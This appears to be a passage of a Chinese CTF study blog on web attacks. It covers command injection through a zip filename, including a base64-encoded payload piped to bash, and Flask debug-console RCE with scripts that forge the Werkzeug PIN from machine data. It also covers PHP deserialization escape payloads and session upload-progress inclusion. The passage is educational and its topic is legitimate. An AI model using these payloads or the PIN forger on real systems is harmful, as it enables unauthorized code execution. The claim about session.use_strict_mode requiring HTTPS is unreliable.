<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">unzip -oq /tmp/1;</span><br><span class="line"><span class="built_in">cat</span> /etc/passwd;</span><br><span class="line">.zip -d /home/</span><br></pre></td></tr></table></figure>

<p>就实现了上传文件达到RCE的目的，并且这些命令大都是以root权限执行的命令，所以操作性极大，危害极大，实际环境应注意这些用户可控的数据数据不能不经过处理并入任何命令中去</p>
<hr>
<p>当然实际环境下命令大都可能会因为一些原因被过滤或者无法执行，亦或者是内容无法回显，可以考虑将其转换为其他编码类型，并将回显内容导入到其他文件中去，再来执行</p>
<blockquote>
<p>1;echo L2ZsYWcgPiAvdmFyL3d3dy9odG1sL3B1YmxpYy9mbGFnLnR4dA&#x3D;&#x3D;|base64 -d|bash;.zip</p>
<p>#echo &#x2F;flag &gt; &#x2F;var&#x2F;www&#x2F;html&#x2F;public&#x2F;flag.txt</p>
</blockquote>
<h1 id="Flask的Debug模式"><a href="#Flask的Debug模式" class="headerlink" title="Flask的Debug模式"></a>Flask的Debug模式</h1><p>在比赛时，看到有道题大佬一直在说看看<code>flask</code>的<code>debug</code>开启没，记录学习一下</p>
<p>使用 Flask 开发过程中存在两个常见的问题：</p>
<blockquote>
<ol>
<li>当 Flask 程序出错时，没有提示错误的详细信息；</li>
<li>修改 Flask 源代码后需要重启 Flask 程序。</li>
</ol>
</blockquote>
<p>debug模式开启的代码就是</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug = <span class="literal">True</span>) <span class="comment">#这里就是开启debug模式</span></span><br></pre></td></tr></table></figure>

<p>运行时，显示输出也会显示debug模式开启</p>
<blockquote>
<p>$ python3 debug.py</p>
<ul>
<li>Serving Flask app “debug” (lazy loading)</li>
<li>Environment: production</li>
<li><code>Debug mode: on</code></li>
<li>Restarting with stat</li>
<li>Debugger is active!</li>
<li>Debugger PIN: 316-471-540</li>
<li>Running on <a target="_blank" rel="noopener" href="http://127.0.0.1:5000/">http://127.0.0.1:5000/</a> (Press CTRL+C to quit)</li>
</ul>
</blockquote>
<p>开启后，当程序运行错误时，网站页面就会将错误点所在代码显示，并且给出错误原因以及修正方案</p>
<p>而如果不开启debug模式，显示的结果就不会显示错误原因</p>
<p><a data-fancybox="gallery" data-src="/Notes/image-20230615002937536.png"><img src="/Notes/image-20230615002937536.png" alt="image-20230615002937536"></a></p>
<p>而开启后就是</p>
<p><a data-fancybox="gallery" data-src="/Notes/image-20230615002956862.png"><img src="/Notes/image-20230615002956862.png" alt="image-20230615002956862"></a></p>
<p>而修改的话，也不用退出程序，重新加载</p>
<p>直接修改代码，然后保存，就会成功修改并且自行重启，并且不会影响程序的正常运行，程序输出也会显示程序已修改</p>
<p><a data-fancybox="gallery" data-src="/Notes/image-20230615003317118.png"><img src="/Notes/image-20230615003317118.png" alt="image-20230615003317118"></a></p>
<h2 id="利用debug功能能干啥"><a href="#利用debug功能能干啥" class="headerlink" title="利用debug功能能干啥"></a>利用debug功能能干啥</h2><p>flask在debug模式下会生成一个debugger pin，并且多次重启flask服务，PIN码不会改变</p>
<p><a data-fancybox="gallery" data-src="/Notes/image-20230615134425055.png"><img src="/Notes/image-20230615134425055.png" alt="image-20230615134425055"></a></p>
<p>通过PIN码可以进入python的交互式shell</p>
<p>如</p>
<p><a data-fancybox="gallery" data-src="/Notes/image-20230615134634288.png"><img src="/Notes/image-20230615134634288.png" alt="image-20230615134634288"></a></p>
<p>这里<code>1/0</code>报错</p>
<p>点击后，右边就会显示一个终端的图标，点击后，需要提供PIN码，然后便可以进入交互式shell</p>
<p><a data-fancybox="gallery" data-src="/Notes/image-20230615134831790.png"><img src="/Notes/image-20230615134831790.png" alt="image-20230615134831790"></a></p>
<p>查看当前目录下文件</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">result = subprocess.run(<span class="string">&#x27;dir&#x27;</span>, shell=<span class="literal">True</span>, stdout=subprocess.PIPE)</span><br><span class="line"></span><br><span class="line">output = result.stdout.decode(<span class="string">&#x27;gbk&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(output)</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/Notes/image-20230615135711738.png"><img src="/Notes/image-20230615135711738.png" alt="image-20230615135711738"></a></p>
<p>而服务器端的请求头</p>
<blockquote>
<p>127.0.0.1 - - [15&#x2F;Jun&#x2F;2023 13:55:30] “GET &#x2F;?&amp;<strong>debugger</strong>&#x3D;yes&amp;cmd&#x3D;import%20subprocess&amp;frm&#x3D;1667679842080&amp;s&#x3D;D2NOP9f9DNQJyoqfpR0O HTTP&#x2F;1.1” 200 -<br>127.0.0.1 - - [15&#x2F;Jun&#x2F;2023 13:55:35] “GET &#x2F;?&amp;<strong>debugger</strong>&#x3D;yes&amp;cmd&#x3D;result%20%3D%20subprocess.run(‘dir’,%20shell%3DTrue,%20stdout%3Dsubprocess.PIPE)&amp;frm&#x3D;1667679842080&amp;s&#x3D;D2NOP9f9DNQJyoqfpR0O HTTP&#x2F;1.1” 200 -<br>127.0.0.1 - - [15&#x2F;Jun&#x2F;2023 13:55:40] “GET &#x2F;?&amp;<strong>debugger</strong>&#x3D;yes&amp;cmd&#x3D;output%20%3D%20result.stdout.decode(‘gbk’)&amp;frm&#x3D;1667679842080&amp;s&#x3D;D2NOP9f9DNQJyoqfpR0O HTTP&#x2F;1.1” 200 -<br>127.0.0.1 - - [15&#x2F;Jun&#x2F;2023 13:55:45] “GET &#x2F;?&amp;<strong>debugger</strong>&#x3D;yes&amp;cmd&#x3D;print(output)&amp;frm&#x3D;1667679842080&amp;s&#x3D;D2NOP9f9DNQJyoqfpR0O HTTP&#x2F;1.1” 200 -</p>
</blockquote>
<p>所以可以看到，启动debug在公开环境下，是非常不安全的，不仅用户可以看到你的代码内容，而且如果当前flask服务的PIN码泄露，还会造成被攻击者远程执行命令等一系列恶意操作</p>
<p>但是也不容易实现这个条件</p>
<p><a data-fancybox="gallery" data-src="/Notes/image-20230617144803167.png"><img src="/Notes/image-20230617144803167.png" alt="image-20230617144803167"></a></p>
<p>因为PIN rce实现是需要设置cookie头的，而且实际进行时会发现 PIN RCE 无法进行<code>CRLF</code>拆分注入，因为它根本不解析回车换行，只能一行行进行输入，所以很难实现</p>
<h2 id="PIN-码如何生成"><a href="#PIN-码如何生成" class="headerlink" title="PIN 码如何生成"></a>PIN 码如何生成</h2><p>但是PIN码并不是随机生成，当我们重复运行同一程序时，生成的PIN一样，PIN码生成满足一定的生成算法</p>
<p>在</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.run(debug = <span class="literal">True</span>)app.run(debug = <span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<p>这段代码敲断点，发现了<code>get_pin_and_cookie_name</code>函数</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_pin_and_cookie_name</span>(<span class="params"></span></span><br><span class="line"><span class="params">    app: <span class="string">&quot;WSGIApplication&quot;</span>,</span></span><br><span class="line"><span class="params"></span>) -&gt; t.<span class="type">Union</span>[t.<span class="type">Tuple</span>[<span class="built_in">str</span>, <span class="built_in">str</span>], t.<span class="type">Tuple</span>[<span class="literal">None</span>, <span class="literal">None</span>]]:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Given an application object this returns a semi-stable 9 digit pin</span></span><br><span class="line"><span class="string">    code and a random key.  The hope is that this is stable between</span></span><br><span class="line"><span class="string">    restarts to not make debugging particularly frustrating.  If the pin</span></span><br><span class="line"><span class="string">    was forcefully disabled this returns `None`.</span></span><br><span class="line"><span class="string">​</span></span><br><span class="line"><span class="string">    Second item in the resulting tuple is the cookie name for remembering.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    pin = os.environ.get(<span class="string">&quot;WERKZEUG_DEBUG_PIN&quot;</span>)</span><br><span class="line">    rv = <span class="literal">None</span></span><br><span class="line">    num = <span class="literal">None</span></span><br><span class="line">​</span><br><span class="line">    Pin was explicitly disabled</span><br><span class="line">    <span class="keyword">if</span> pin == <span class="string">&quot;off&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line">​</span><br><span class="line">    <span class="comment"># Pin was provided explicitly</span></span><br><span class="line">    <span class="keyword">if</span> pin <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> pin.replace(<span class="string">&quot;-&quot;</span>, <span class="string">&quot;&quot;</span>).isdigit():</span><br><span class="line">        <span class="comment"># If there are separators in the pin, return it directly</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;-&quot;</span> <span class="keyword">in</span> pin:</span><br><span class="line">            rv = pin</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            num = pin</span><br><span class="line">​</span><br><span class="line">    modname = <span class="built_in">getattr</span>(app, <span class="string">&quot;__module__&quot;</span>, t.cast(<span class="built_in">object</span>, app).__class__.__module__)</span><br><span class="line">    username: t.<span class="type">Optional</span>[<span class="built_in">str</span>]</span><br><span class="line">​</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># getuser imports the pwd module, which does not exist in Google</span></span><br><span class="line">        <span class="comment"># App Engine. It may also raise a KeyError if the UID does not</span></span><br><span class="line">        <span class="comment"># have a username, such as in Docker.</span></span><br><span class="line">        username = getpass.getuser()</span><br><span class="line">    <span class="keyword">except</span> (ImportError, KeyError):</span><br><span class="line">        username = <span class="literal">None</span></span><br><span class="line">​</span><br><span class="line">    mod = sys.modules.get(modname)</span><br><span class="line">​</span><br><span class="line">    <span class="comment"># This information only exists to make the cookie unique on the</span></span><br><span class="line">    <span class="comment"># computer, not as a security feature.</span></span><br><span class="line">    probably_public_bits = [</span><br><span class="line">        username,</span><br><span class="line">        modname,</span><br><span class="line">        <span class="built_in">getattr</span>(app, <span class="string">&quot;__name__&quot;</span>, <span class="built_in">type</span>(app).__name__),</span><br><span class="line">        <span class="built_in">getattr</span>(mod, <span class="string">&quot;__file__&quot;</span>, <span class="literal">None</span>),</span><br><span class="line">    ]</span><br><span class="line">​</span><br><span class="line">    <span class="comment"># This information is here to make it harder for an attacker to</span></span><br><span class="line">    <span class="comment"># guess the cookie name.  They are unlikely to be contained anywhere</span></span><br><span class="line">    <span class="comment"># within the unauthenticated debug page.</span></span><br><span class="line">    private_bits = [<span class="built_in">str</span>(uuid.getnode()), get_machine_id()]</span><br><span class="line">​</span><br><span class="line">    h = hashlib.sha1()</span><br><span class="line">    <span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">            bit = bit.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">        h.update(bit)</span><br><span class="line">    h.update(<span class="string">b&quot;cookiesalt&quot;</span>)</span><br><span class="line">​</span><br><span class="line">    cookie_name = <span class="string">f&quot;__wzd<span class="subst">&#123;h.hexdigest()[:<span class="number">20</span>]&#125;</span>&quot;</span></span><br><span class="line">​</span><br><span class="line">    <span class="comment"># If we need to generate a pin we salt it a bit more so that we don&#x27;t</span></span><br><span class="line">    <span class="comment"># end up with the same value and generate out 9 digits</span></span><br><span class="line">    <span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        h.update(<span class="string">b&quot;pinsalt&quot;</span>)</span><br><span class="line">        num = <span class="string">f&quot;<span class="subst">&#123;<span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>):09d&#125;</span>&quot;</span>[:<span class="number">9</span>]</span><br><span class="line">​</span><br><span class="line">    <span class="comment"># Format the pincode in groups of digits for easier remembering if</span></span><br><span class="line">    <span class="comment"># we don&#x27;t have a result yet.</span></span><br><span class="line">    <span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">                rv = <span class="string">&quot;-&quot;</span>.join(</span><br><span class="line">                    num[x : x + group_size].rjust(group_size, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">                    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size)</span><br><span class="line">                )</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            rv = num</span><br><span class="line">​</span><br><span class="line">    <span class="keyword">return</span> rv, cookie_name</span><br></pre></td></tr></table></figure>

<p><strong>生成要素：</strong></p>
<blockquote>
<p>username<br>通过getpass.getuser()读取，通过文件读取&#x2F;etc&#x2F;passwd<br>引用<br>modname<br>通过getattr(mod,“file”,None)读取，默认值为flask.app<br>引用<br>appname<br>通过getattr(app,“name”,type(app).name)读取，默认值为Flask<br>引用<br>moddir<br>当前网络的mac地址的十进制数，通过getattr(mod,“file”,None)读取实际应用中通过报错读取<br>引用<br>uuidnode<br>通过uuid.getnode()读取，通过文件&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address得到16进制结果，转化为10进制进行计算<br>引用<br>machine_id<br>每一个机器都会有自已唯一的id，machine_id由三个合并(docker就后两个)：</p>
<p>1.&#x2F;etc&#x2F;machine-id (&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address)</p>
<p>2.&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_id </p>
<p>3.&#x2F;proc&#x2F;self&#x2F;cgroup</p>
</blockquote>
<blockquote>
<p><strong>不同版本算法区别</strong><br>3.6采用MD5加密，3.8采用sha1加密，所以脚本有所不同</p>
</blockquote>
<h3 id="生成算法"><a href="#生成算法" class="headerlink" title="生成算法"></a>生成算法</h3><p>3.6 MD5</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#MD5</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">     <span class="string">&#x27;flaskweb&#x27;</span></span><br><span class="line">     <span class="string">&#x27;flask.app&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;Flask&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27;</span></span><br><span class="line">]</span><br><span class="line">​</span><br><span class="line">private_bits = [</span><br><span class="line">     <span class="string">&#x27;25214234362297&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;0402a7ff83cc48b41b227763d03b386cb5040585c82f3b99aa3ad120ae69ebaa&#x27;</span></span><br><span class="line">]</span><br><span class="line">​</span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line">​</span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line">​</span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">   h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">   num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line">​</span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">   <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">       <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">          rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                      <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">          <span class="keyword">break</span></span><br><span class="line">       <span class="keyword">else</span>:</span><br><span class="line">          rv = num</span><br><span class="line">​</span><br><span class="line"><span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure>

<p>3.8 SHA-1</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sha1</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;root&#x27;</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.8/site-packages/flask/app.py&#x27;</span></span><br><span class="line">]</span><br><span class="line">​</span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;2485377581187&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;653dc458-4634-42b1-9a7a-b22a082e1fce55d22089f5fa429839d25dcea4675fb930c111da3bb774a6ab7349428589aefd&#x27;</span></span><br><span class="line">]</span><br><span class="line">​</span><br><span class="line">h = hashlib.sha1()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line">​</span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line">​</span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line">​</span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line">​</span><br><span class="line"><span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure>

<h1 id="反序列化逃逸"><a href="#反序列化逃逸" class="headerlink" title="反序列化逃逸"></a>反序列化逃逸</h1><blockquote>
<p>变短吸收后面，变长挤掉后面</p>
<p>s:5:”12345”中</p>
<p>5是说明也是限制，后面的5个字符都属于字符串</p>
<p>s:5:”1234””中</p>
<p>1234”也算是字符串，”不起闭合作用</p>
<ol>
<li><p>如变长</p>
<blockquote>
<p>x-&gt;yy</p>
<p>s:6:”xxxxxx”</p>
<p>filter后</p>
<p>s:6:”yyyyyyyyyyyy”(反序列化会报错)</p>
</blockquote>
<p>所以修改一下filter前的</p>
<blockquote>
<p>s:6:”xxx”;}”</p>
<p>其中字符串为xxx”;} 这6个，但是当x-&gt;yy后，xxx变长为6位xxxxxx</p>
<p>s:6:”yyyyyy”;}”</p>
<p>字符串就为yyyyyy了，<code>&quot;;&#125;</code>就实现了成功逃逸，将语句闭合，当然逃逸数据可以修改，长度刚好为变长部分长度</p>
</blockquote>
</li>
<li><p>如变短</p>
<blockquote>
<p>xx-&gt;y</p>
<p>s:6:”xxxxxx”;}O:5</p>
<p>filter后</p>
<p>s:6:”yyy”;}O:5(反序列化会报错)</p>
</blockquote>
<p>所以修改一下filter前的</p>
<blockquote>
<p>s:18:”<code>xxxxxxxxxxxxxxxxxx</code>“;s:23:”<code>a&quot;;&#125;O:4:&#123;s:5:&quot;hacker&quot;;&#125;</code>“;}O:5</p>
<p>其中字符串为这16个，但是当xx-&gt;y后，xxxxxxxxxxxxxxxxxx变短为9位xxxxxxxxx</p>
<p>s:18:”<code>yyyyyyyyy&quot;;s:23:&quot;a</code>“;}O:4:{s:4:”hacker”;}”;}O:5</p>
<p>字符串就为<code>yyyyyyyyy&quot;;s:23:&quot;a</code>了，</p>
<p>而;}就将其闭合了，而后<code>O:4:&#123;s:5:&quot;hacker&quot;;&#125;</code>就逃出来了</p>
<p>变短就是数一下后面需要吞掉截断的字符串到其最后一个引号的字符个数，要是filter数据长度的一半</p>
</blockquote>
</li>
</ol>
</blockquote>
<h1 id="session进行文件包含"><a href="#session进行文件包含" class="headerlink" title="session进行文件包含"></a>session进行文件包含</h1><blockquote>
<p><code>session包含需要session打开，没打开怎么办，页面没有session</code></p>
</blockquote>
<h2 id="session-upload-progress作用？"><a href="#session-upload-progress作用？" class="headerlink" title="session.upload_progress作用？"></a><code>session.upload_progress</code>作用？</h2><blockquote>
<p><code>session.upload_progress.enabled</code> &#x3D; <strong>on</strong></p>
<p><code>session.upload_progress.cleanup</code> &#x3D; <strong>on</strong></p>
<p><code>session.upload_progress.prefix</code> &#x3D; “<strong>upload_progress_</strong>“</p>
<p><code>session.upload_progress.name</code> &#x3D; “<strong>PHP_SESSION_UPLOAD_PROGRESS</strong>“</p>
</blockquote>
<blockquote>
<p><code>session.upload_progress.enabled</code>可以控制是否开启session.upload_progress功能</p>
<p><code>session.upload_progress.cleanup</code>可以控制是否在上传之后删除文件内容</p>
<p><code>session.upload_progress.prefix</code>可以设置上传文件内容的前缀</p>
<p><code>session.upload_progress.name</code>的值即为session中的键值</p>
</blockquote>
<p>session.upload_progress开启之后，此时我们再往服务器中上传一个文件时，PHP会把该文件的详细信息(如上传时间、上传</p>
<p>进度等)存储在session当中。</p>
<p><strong>初始化session</strong></p>
<p><code>session.use_strict_mode</code>是一个PHP配置选项，它指定了在使用cookie存储会话ID时是否启用严格模式。当启用严格模式时，会话</p>
<p>ID只能通过HTTPS连接传输，并且不能通过URL参数传递。这可以防止会话劫持攻击。如果未启用严格模式，则会话ID可以通过HTTP连</p>
<p>接传输，并且可以通过URL参数传递。这可能会导致会话劫持攻击。默认情况下，<code>session.use_strict_mode</code>设置为0（禁用）</p>
<h1 id="hash长度扩展攻击"><a href="#hash长度扩展攻击" class="headerlink" title="hash长度扩展攻击"></a>hash长度扩展攻击</h1><blockquote>
<p>学习文章</p>
<p><a target="_blank" rel="noopener" href="https://j-kangel.github.io/2019/04/05/hash-attack/">hash长度扩展攻击 | KANGEL (j-kangel.github.io)</a></p>
</blockquote>
<blockquote>
<p>Hash长度拓展攻击（Length Extension Attack）是一种针对特定类型哈希算法的攻击技术。哈希算法是一种将任意大小的数据转换成固定大小哈希值（通常是一串十六进制字符）的算法。这些哈希值通常用于校验数据完整性和验证数据的唯一性。</p>
<p>在正常情况下，哈希算法的输出长度是固定的，而且算法是不可逆的，意味着从哈希值恢复原始数据是非常困难的。但是，由于一些哈希算法的设计问题，存在一种被称为“Hash长度拓展攻击”的漏洞。</p>
<p>Hash长度拓展攻击利用了特定哈希算法的漏洞，使攻击者能够根据已知的哈希值和原始数据的部分内容生成一个新的有效哈希值，而无需知道原始数据的其余部分。攻击者能够在已知哈希值的基础上构造出一个新的哈希值，看起来就像是在已知数据后附加了其他内容，并且新的哈希值也是有效的。</p>
</blockquote>
<h2 id="MD5加密原理"><a href="#MD5加密原理" class="headerlink" title="MD5加密原理"></a>MD5加密原理</h2><p>先放图，（虽然上了密码学课</p>
